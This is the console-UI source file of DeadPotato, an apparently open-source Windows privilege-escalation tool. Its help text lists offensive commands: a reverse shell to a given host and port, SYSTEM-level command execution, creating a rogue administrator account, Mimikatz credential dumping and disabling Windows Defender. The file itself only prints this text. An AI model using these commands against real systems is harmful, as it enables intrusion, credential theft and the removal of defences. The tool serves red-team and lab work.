﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace DeadPotato
{
    internal class UI
    {
        static bool IsWindows10()
        {
            return RuntimeInformation.OSDescription.Contains("Windows 10."); // Very quick, so the banner does not cry over win10
        }

        public static void printColor(string input)
        {
            // Define a dictionary to map color names to ConsoleColor
            var colorMap = new Dictionary<string, ConsoleColor>
        {
            { "black", ConsoleColor.Black },
            { "red", ConsoleColor.Red },
            { "green", ConsoleColor.Green },
            { "yellow", ConsoleColor.Yellow },
            { "blue", ConsoleColor.Blue },
            { "magenta", ConsoleColor.Magenta },
            { "cyan", ConsoleColor.Cyan },
            { "white", ConsoleColor.White },
            { "darkgray", ConsoleColor.DarkGray },
            { "darkred", ConsoleColor.DarkRed },
            { "darkgreen", ConsoleColor.DarkGreen },
            { "darkyellow", ConsoleColor.DarkYellow },
            { "darkblue", ConsoleColor.DarkBlue },
            { "darkmagenta", ConsoleColor.DarkMagenta },
            { "darkcyan", ConsoleColor.DarkCyan },
            { "gray", ConsoleColor.Gray },
        };

            // Regex to match color tags
            var regex = new Regex(@"<(?<color>\w+)>(?<text>.*?)<\/\k<color>>", RegexOptions.Singleline);

            // Create a TextWriter instance for the console output
            TextWriter consoleWriter = Console.Out;

            // Use StringBuilder to construct the output
            var result = new System.Text.StringBuilder();
            int lastIndex = 0;

            foreach (Match match in regex.Matches(input))
            {
                // Append text before the current match
                result.Append(input.Substring(lastIndex, match.Index - lastIndex));

                string color = match.Groups["color"].Value;
                string text = match.Groups["text"].Value;

                // Print the text before the current match
                consoleWriter.Write(result.ToString());

                // Set the color if it is defined, otherwise use reset color
                if (colorMap.ContainsKey(color))
                {
                    Console.ForegroundColor = colorMap[color];
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Gray; // Default color
                }

                // Print the text with the current color
                consoleWriter.Write(text);
                Console.ResetColor(); // Reset color after the text

                // Prepare for next match
                lastIndex = match.Index + match.Length;
                result.Clear();
            }

            // Append remaining text after the last match
            result.Append(input.Substring(lastIndex));

            // Print the remaining text
            consoleWriter.Write(result.ToString());
        }
        public static void printHelp()
        {
            Console.OutputEncoding = Encoding.UTF8;
            printBanner();
            printColor(@"

 (<darkred>*</darkred>) Example Usage(s):

   -={ deadpotato.exe -MODULE [ARGUMENTS] }=-

   -> deadpotato.exe -cmd ""whoami""
   -> deadpotato.exe -rev 192.168.10.30:9001
   -> deadpotato.exe -exe paylod.exe
   -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
   -> deadpotato.exe -shell
   -> deadpotato.exe -mimi sam
   -> deadpotato.exe -defender off
   -> deadpotato.exe -sharphound

 (<darkred>*</darkred>) Available Modules:
   
   - cmd: Execute a command as NT AUTHORITY\SYSTEM.
   - rev: Attempts to establish a reverse shell connection to the provided host
   - exe: Execute a program with NT AUTHORITY\SYSTEM privileges (Does not support interactivity).
   - newadmin: Create a new administrator user on the local system.
   - shell: Manages to achieve a semi-interactive shell (NOTE: Very bad OpSec!)
   - mimi: Attempts to dump SAM/LSA/SECRETS with Mimikatz. (NOTE: This will write mimikatz to disk!)
   - defender: Either enables or disables Windows Defender's real-time protection.
   - sharphound: Attempts to collect domain data for BloodHound.

");

        }
        public static void printBanner()
        {
            Console.OutputEncoding = Encoding.UTF8;

            if (IsWindows10())
            {
                printColor($"      _.--,_\n   .-'      '-.         <darkred> _           _ </darkred>\n  /            \\        <darkred>| \\ _  _  _||_) _ _|_ _ _|_ _ </darkred>\n '          _.  '       <darkred>|_/(/_(_|(_||  (_) |_(_| |_(_)</darkred>\n \\      \"\"\"\" /  ~(      Open Source @ github.com/<white>lypd0</white>\n  '=,,_ =\\__ `  &             -= Version: <green>{Program.version}</green> =-\n        \"\"  \"\"'; \\\\\\ \n\n\n_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_\n\n");
            }
            else
            {
                printColor($@"

    ⠀⢀⣠⣤⣤⣄⡀⠀   <darkred> _           _ </darkred>
    ⣴⣿⣿⣿⣿⣿⣿⣦   <darkred>| \ _  _  _||_) _ _|_ _ _|_ _ </darkred>
    ⣿⣿⣿⣿⣿⣿⣿⣿   <darkred>|_/(/_(_|(_||  (_) |_(_| |_(_)</darkred>
    ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/<white>lypd0</white>
    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: <green>{Program.version}</green> =-       
    ⠀⠀⠀⠈⠁⠀⠀⠀

_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

");
            }
        }
    }
}
